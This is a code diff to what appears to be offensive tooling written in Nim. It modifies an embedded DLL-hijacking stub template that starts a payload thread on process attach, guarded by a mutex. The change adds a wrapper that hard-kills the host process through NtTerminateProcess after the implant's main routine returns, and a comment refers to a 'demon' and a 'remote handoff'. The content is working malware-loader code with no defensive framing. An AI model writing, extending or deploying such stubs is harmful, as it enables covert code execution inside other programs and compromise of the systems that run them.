@@ -3093,6 +3093,15 @@ let PerfectDLLHijackStub = """
 
 import perfecthijack
 
+proc mainWrapper(lpParam: LPVOID): DWORD {.stdcall.} =
+  result = main(lpParam)
+  # main returned: remote handoff complete (or demon exited in localexec) -> hard kill
+  let ntp = cast[proc (h: HANDLE, s: NTSTATUS): NTSTATUS {.stdcall.}](
+    GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTerminateProcess"))
+  if ntp != nil:
+    discard ntp(GetCurrentProcess(), 0)
+  discard TerminateProcess(GetCurrentProcess(), 0)
+
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
   # only run once, on process attach (original ran on every THREAD_ATTACH too)
   if fdwReason != DLL_PROCESS_ATTACH:
@@ -3154,10 +3163,10 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
           let mutex = CreateMutexA(nil, TRUE, mutexName)
           if mutex != 0 and GetLastError() != ERROR_ALREADY_EXISTS:
             var tid: DWORD
-            discard CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](main), nil, 0, addr tid)
+            discard CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](mainWrapper), nil, 0, addr tid)
       else:
         var tid: DWORD
-        discard CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](main), nil, 0, addr tid)
+        discard CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](mainWrapper), nil, 0, addr tid)
 
   return true
 """
